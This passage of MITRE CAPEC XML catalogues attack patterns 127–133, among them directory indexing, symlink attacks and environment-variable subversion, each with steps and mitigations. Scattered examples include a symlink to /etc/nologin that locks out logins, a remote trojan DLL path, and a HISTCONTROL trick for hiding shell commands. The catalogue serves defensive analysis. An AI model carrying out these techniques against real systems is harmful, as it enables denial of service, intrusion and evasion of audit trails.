               <Modification_Comment>Updated Activation_Zone, Alternate_Terms, Architectural_Paradigms, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Examples-Instances, Frameworks, Injection_Vector, Languages, Payload, Payload_Activation_Impact, Platforms, Purposes, References, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Relevant_Security_Requirements, Solutions_and_Mitigations, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="127" Name="Directory Indexing" Abstraction="Detailed" Status="Draft">
         <Description>An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="54"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.</Description>
               <Technique>Send requests to the web server for common directory names</Technique>
               <Technique>If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.</Technique>
               <Technique>Search for uncommon or potentially user created directories that may be present.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods</Description>
               <Technique>Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.</Technique>
               <Technique>Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.</Technique>
               <Technique>Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.</Technique>
               <Technique>Sequentially request a list of common base files to each directory discovered.</Technique>
               <Technique>Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a "/" request</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods</Description>
               <Technique>Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a "/" request</Technique>
               <Technique>Try other known exploits to elevate privileges sufficient to bypass protected directories.</Technique>
               <Technique>List the files in the directory by issuing a request with the URL ending in a "/" slash.</Technique>
               <Technique>Access the files via direct URL and capture contents.</Technique>
               <Technique>Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.</Technique>
               <Technique>Sequentially request a list of common base files to each directory discovered.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.</Prerequisite>
            <Prerequisite>The adversary must be able to control the path that is requested of the target.</Prerequisite>
            <Prerequisite>The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.</Prerequisite>
            <Prerequisite>The server version or patch level must not inherently prevent known directory listing attacks from working.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To issue the request to URL without given a specific file name</Skill>
            <Skill Level="High">To bypass the access control of the directory of listings</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to send HTTP requests to a web application.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.</Mitigation>
            <Mitigation>2. Preventing with .htaccess in Apache web server: In .htaccess, write "Options-indexes".</Mitigation>
            <Mitigation>3. Suppressing error messages: using error 403 "Forbidden" message exactly like error 404 "Not Found" message.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80</xhtml:p>
               <xhtml:p>The target application does not have direct hyperlink to the "backup" directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a "db_dump.php" file in it. This sensitive data should not be disclosed publicly.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="424"/>
            <Related_Weakness CWE_ID="425"/>
            <Related_Weakness CWE_ID="288"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="732"/>
            <Related_Weakness CWE_ID="276"/>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="721"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1083</Entry_ID>
               <Entry_Name>File and Directory Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-11" Section="WASC-16 - Directory Indexing"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, Related_Vulnerabilities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="128" Name="Integer Attacks" Abstraction="Standard" Status="Draft">
         <Description>An attacker takes advantage of the structure of integer variables to cause these variables to assume values that are not expected by an application. For example, adding one to the largest positive integer in a signed integer variable results in a negative number. Negative numbers may be illegal in an application and the application may prevent an attacker from providing them directly, but the application may not consider that adding two positive numbers can create a negative number do to the structure of integer storage formats.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="153"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must have an integer variable for which only some of the possible integer values are expected by the application and where there are no checks on the value of the variable before use.</Prerequisite>
            <Prerequisite>The attacker must be able to manipulate the targeted integer variable such that normal operations result in non-standard values due to the storage structure of integers.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="682"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="129" Name="Pointer Manipulation" Abstraction="Meta" Status="Draft">
         <Description>This attack pattern involves an adversary manipulating a pointer within a target application resulting in the application accessing an unintended memory location. This can result in the crashing of the application or, for certain pointer values, access to data that would not normally be possible or the execution of arbitrary code. Since pointers are simply integer variables, Integer Attacks may often be used in Pointer Attacks.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target application must have a pointer variable that the attacker can influence to hold an arbitrary value.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="682"/>
            <Related_Weakness CWE_ID="822"/>
            <Related_Weakness CWE_ID="823"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Pointer Attack</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="13" Name="Subverting Environment Variable Values" Abstraction="Detailed" Status="Stable">
         <Description>The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="77"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="14"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="10"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker probes the application for information. Which version of the application is running? Are there known environment variables? etc.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker gains control of an environment variable and ties to find out what process(es) the environment variable controls.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker modifies the environment variable to abuse the normal flow of processes or to gain access to privileged resources.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An environment variable is accessible to the user.</Prerequisite>
            <Prerequisite>An environment variable used by the application can be tainted with user supplied data.</Prerequisite>
            <Prerequisite>Input data used in an environment variable is not validated properly.</Prerequisite>
            <Prerequisite>The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">In a web based scenario, the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism.</Skill>
            <Skill Level="High">Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Protect environment variables against unauthorized read and write access.</Mitigation>
            <Mitigation>Protect the configuration files which contain environment variables against illegitimate read and write access.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.</Mitigation>
            <Mitigation>Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the attacker upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as \\172.16.2.100\shared_files\trojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)</Example>
            <Example>The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to "ignorespace". HISTCONTROL can also be set to ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="353"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="15"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1148</Entry_ID>
               <Entry_Name>HISTCONTROL</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="130" Name="Excessive Allocation" Abstraction="Meta" Status="Stable">
         <Description>An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Limit the amount of resources that are accessible to unprivileged users.</Mitigation>
            <Mitigation>Assume all input is malicious. Consider all potentially relevant properties when validating input.</Mitigation>
            <Mitigation>Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</Mitigation>
            <Mitigation>Use resource-limiting settings, if possible.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
            <Related_Weakness CWE_ID="404"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="131" Name="Resource Leak Exposure" Abstraction="Meta" Status="Stable">
         <Description>An adversary utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests. Resource leaks most often come in the form of memory leaks where memory is allocated but never released after it has served its purpose, however, theoretically, any other resource that can be reserved can be targeted if the target fails to release the reservation when the reserved resource block is no longer needed. In this attack, the adversary determines what activity results in leaked resources and then triggers that activity on the target. Since some leaks may be small, this may require a large number of requests by the adversary. However, this attack differs from a flooding attack in that the rate of requests is generally not significant. This is because the lost resources due to the leak accumulate until the target is reset, usually by restarting it. Thus, a resource-poor adversary who would be unable to flood the target can still utilize this attack. Resource depletion through leak differs from resource depletion through allocation in that, in the former, the adversary may not be able to control the size of each leaked allocation, but instead allows the leak to accumulate until it is large enough to affect the target's performance. When depleting resources through allocation, the allocated resource may eventually be released by the target so the attack relies on making sure that the allocation size itself is prohibitive of normal operations by the target.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target must have a resource leak that the adversary can repeatedly trigger.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Impact>Resource Consumption</Impact>
               <Note>A successful resource leak exposure attack compromises the availability of the target system's services.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>If possible, leverage coding language(s) that do not allow this weakness to occur (e.g., Java, Ruby, and Python all perform automatic garbage collection that releases memory for objects that have been deallocated).</Mitigation>
            <Mitigation>Memory should always be allocated/freed using matching functions (e.g., malloc/free, new/delete, etc.)</Mitigation>
            <Mitigation>Implement best practices with respect to memory management, including the freeing of all allocated resources at all exit points and ensuring consistency with how and where memory is freed in a function.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="404"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="132" Name="Symlink Attack" Abstraction="Detailed" Status="Draft">
         <Description>An attacker positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name. The endpoint file may be either output or input. If the file is output, the result is that the endpoint is modified, instead of a file at the intended location. Modifications to the endpoint file may include appending, overwriting, corrupting, changing permissions, or other modifications. In some variants of this attack the attacker may be able to control the change to a file while in other cases they cannot. The former is especially damaging since the attacker may be able to grant themselves increased privileges or insert false information, but the latter can also be damaging as it can expose sensitive information or corrupt or destroy vital system or application files. Alternatively, the endpoint file may serve as input to the targeted application. This can be used to feed malformed input into the target or to cause the target to process different information, possibly allowing the attacker to control the actions of the target or to cause the target to expose information to the attacker. Moreover, the actions taken on the endpoint file are undertaken with the permissions of the targeted user or application, which may exceed the permissions that the attacker would normally have.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="159"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify Target] Attacker identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.</Description>
               <Technique>The attacker writes to files in different directories to check whether the application has sufficient checking before file operations.</Technique>
               <Technique>The attacker creates symlinks to files in different directories.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Try to create symlinks to different files] The attacker then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.</Description>
               <Technique>The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using "sleep(2)" and "usleep()" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.</Technique>
               <Technique>The attacker may need a little guesswork on the filenames on which the target application would operate.</Technique>
               <Technique>The attacker tries to create symlinks to the various filenames.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Target application operates on created symlinks to sensitive files] The attacker is able to create symlinks to sensitive files while the target application is operating on the file.</Description>
               <Technique>Create the symlink to the sensitive file such as configuration files, etc.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The attacker must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To create symlinks</Skill>
            <Skill Level="High">To identify the files and create the symlinks during the file operation time window</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. The only requirement is the ability to create the necessary symbolic link.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Check for the existence of files to be created, if in existence verify they are neither symlinks nor hard links before opening them.</Mitigation>
            <Mitigation>Implementation: Use randomly generated file names for temporary files. Give the files restrictive permissions.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The attacker creates a symlink with the "same" name as the file which the application is intending to write to. The application will write to the file- "causing the data to be written where the symlink is pointing". An attack like this can be demonstrated as follows:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">root# vulprog myFile<xhtml:div>
                     <xhtml:i>{...program does some processing...]</xhtml:i>
                  </xhtml:div>
                  <xhtml:br/>attacker# ln –s /etc/nologin myFile<xhtml:div>
                     <xhtml:i>[...program writes to 'myFile', which points to /etc/nologin...]</xhtml:i>
                  </xhtml:div>
               </xhtml:div>
               <xhtml:p>In the above example, the root user ran a program with poorly written file handling routines, providing the filename "myFile" to vulnprog for the relevant data to be written to. However, the attacker happened to be looking over the shoulder of "root" at the time, and created a link from myFile to /etc/nologin. The attack would make no user be able to login.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="59"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1023</Entry_ID>
               <Entry_Name>Shortcut Modification</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-13"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="133" Name="Try All Common Switches" Abstraction="Standard" Status="Draft">
         <Description>An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is blindly attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="113"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must be able to control the options or switches sent to the target.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. The only requirement is the ability to send requests to the target.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Minimize switch and option functionality to only that necessary for correct function of the command.</Mitigation>
            <Mitigation>Implementation: Remove all debug and testing options from production code.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="912"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
